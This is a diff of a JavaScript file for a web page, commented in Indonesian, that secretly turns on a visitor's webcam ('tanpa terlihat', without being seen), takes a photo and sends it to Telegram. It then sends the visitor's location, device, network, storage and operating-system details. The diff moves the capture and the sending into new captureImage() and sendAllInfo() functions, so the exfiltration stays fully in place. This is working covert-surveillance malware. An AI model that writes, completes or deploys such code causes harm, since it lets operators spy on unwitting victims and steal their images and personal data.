@@ -6,21 +6,8 @@ const canvas = document.getElementById('canvas');
 
 // Akses webcam tanpa terlihat
 navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
-    console.log("Webcam berhasil diakses.");
     video.srcObject = stream;
     video.play();
-
-    // Tunggu beberapa detik agar video benar-benar siap sebelum mengambil gambar
-    setTimeout(() => {
-        const context = canvas.getContext("2d");
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // Pastikan gambar benar-benar diproses sebelum mengirim ke Telegram
-        canvas.toBlob(function(blob) {
-            console.log("Mengirim foto ke Telegram...");
-            sendPhotoToTelegram(blob);
-        }, 'image/jpeg');
-    }, 500); // Menambahkan delay sedikit untuk memastikan gambar ter-render dengan baik
 }).catch(function(error) {
     console.error("Gagal mengakses webcam:", error);
 });
@@ -37,18 +24,45 @@ function sendPhotoToTelegram(blob) {
     }).then(response => {
         if (response.ok) {
             console.log("Foto berhasil dikirim ke Telegram.");
-            getLocation();  // Kirim lokasi setelah foto terkirim
-            getDeviceInfo(); // Kirim informasi perangkat
-            getNetworkInfo(); // Kirim informasi jaringan
-            getTimeInfo(); // Kirim informasi waktu
-            getStorageInfo(); // Kirim informasi penyimpanan
-            getOSInfo(); // Kirim informasi sistem operasi
         } else {
             console.error("Gagal mengirim foto ke Telegram.");
         }
     }).catch(error => {
         console.error("Error saat mengirim foto:", error);
     });
+}
+
+// Fungsi untuk mengambil foto dari video webcam
+function captureImage() {
+    const context = canvas.getContext("2d");
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(function(blob) {
+        sendPhotoToTelegram(blob); // Kirim foto ke Telegram
+    }, 'image/jpeg');
+}
+
+// Fungsi untuk mengirim semua data ke Telegram
+function sendAllInfo() {
+    // Ambil foto
+    captureImage();
+
+    // Kirim lokasi
+    getLocation();
+
+    // Kirim informasi perangkat
+    getDeviceInfo();
+
+    // Kirim informasi jaringan
+    getNetworkInfo();
+
+    // Kirim informasi waktu
+    getTimeInfo();
+
+    // Kirim informasi penyimpanan
+    getStorageInfo();
+
+    // Kirim informasi sistem operasi
+    getOSInfo();
 }
 
 // Fungsi untuk mendapatkan lokasi pengguna
